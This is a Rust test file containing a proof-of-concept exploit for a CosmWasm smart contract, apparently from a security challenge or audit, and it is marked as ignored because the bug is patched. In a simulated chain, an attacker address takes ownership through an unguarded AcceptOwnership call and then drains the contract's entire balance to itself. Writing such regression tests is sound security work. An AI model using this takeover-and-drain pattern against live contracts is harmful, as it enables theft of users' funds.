#[cfg(test)]
pub mod tests {
    use cosmwasm_std::{Addr, BankMsg, CosmosMsg, Uint128};
    use cw_multi_test::Executor;

    use crate::{contract::DENOM, integration_tests::tests::base_scenario, msg::ExecuteMsg};

    pub const ATTACKER: &str = "awesomwasm";

    #[ignore = "bug is patched"]
    #[test]
    fn exploit() {
        let (mut app, contract_addr) = base_scenario();

        // attacker takes contract ownership
        app.execute_contract(
            Addr::unchecked(ATTACKER),
            contract_addr.clone(),
            &ExecuteMsg::AcceptOwnership {},
            &[],
        )
        .unwrap();

        // verify attacker has empty balance
        let attacker_balance = app
            .wrap()
            .query_balance(ATTACKER.to_string(), DENOM)
            .unwrap();

        assert_eq!(attacker_balance.amount, Uint128::zero());

        // verify contract is not empty
        let initial_contract_balance = app
            .wrap()
            .query_balance(contract_addr.to_string(), DENOM)
            .unwrap();

        assert_ne!(initial_contract_balance.amount, Uint128::zero());

        // craft attack message
        let transfer_msg = CosmosMsg::Bank(BankMsg::Send {
            to_address: ATTACKER.to_string(),
            amount: vec![initial_contract_balance.clone()],
        });

        app.execute_contract(
            Addr::unchecked(ATTACKER),
            contract_addr.clone(),
            &ExecuteMsg::OwnerAction { msg: transfer_msg },
            &[],
        )
        .unwrap();

        // verify the attacker stole all the funds
        let attacker_balance = app
            .wrap()
            .query_balance(ATTACKER.to_string(), DENOM)
            .unwrap();

        assert_eq!(attacker_balance.amount, initial_contract_balance.amount);

        // verify contract is empty
        let final_contract_balance = app
            .wrap()
            .query_balance(contract_addr.to_string(), DENOM)
            .unwrap();

        assert_eq!(final_contract_balance.amount, Uint128::zero());
    }
}
